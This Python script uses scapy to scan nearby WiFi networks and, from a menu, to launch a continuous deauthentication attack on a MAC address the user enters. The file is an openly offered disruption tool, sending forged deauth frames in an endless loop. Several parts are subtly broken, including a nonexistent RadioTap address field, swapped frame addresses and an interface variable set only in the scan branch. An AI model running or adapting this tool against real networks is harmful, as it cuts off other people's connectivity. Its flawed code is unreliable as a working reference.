import os
import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sniff, sendp

# Function to scan and print WiFi information, including interface and MAC
def scan_wifi_info(pkt):
    if pkt.haslayer(Dot11):
        bssid = pkt[Dot11].addr2
        ssid = pkt[Dot11].info.decode()
        interface_type = pkt[RadioTap].present
        interface_mac = pkt[RadioTap].addr2
        print(f"SSID: {ssid} | BSSID: {bssid} | Interface Type: {interface_type} | Interface MAC: {interface_mac}")

# Function to perform deauthentication attack
def jam_network(interface, target_mac):
    while True:
        # Craft the deauthentication packet
        deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3=target_mac) / Dot11Deauth(reason=7)

        # Send the packet repeatedly to jam the target
        for i in range(100):
            sendp(deauth_packet, iface=interface, verbose=False)
            print(f"Sent {i+1} packets", end="\r")  # Print the progress
            time.sleep(0.05)  # Adjust the sleep time as needed

        # Pause for a moment before sending more deauth packets
        print("\nWaiting for the next round of deauthentication...")
        time.sleep(5)

# Main function
def main():
    print("WiFi Network Scanner and Jammer")

    while True:
        print("\nMenu:")
        print("1. Scan WiFi Networks")
        print("2. Jam a WiFi Network")
        print("3. Exit")
        
        choice = input("Enter your choice (1/2/3): ")

        if choice == '1':
            # Set your wireless interface
            interface = input("Set your Wireless Interface: ")

            # Start scanning for WiFi networks
            sniff(iface=interface, prn=scan_wifi_info, timeout=10)
        elif choice == '2':
            # Set the target's MAC address
            target_mac = input("Insert Target's MAC Address: ")

            # Perform deauthentication attack with progress bar
            print("Jamming in progress:")
            jam_network(interface, target_mac)
        elif choice == '3':
            print("Exiting the program.")
            break
        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()
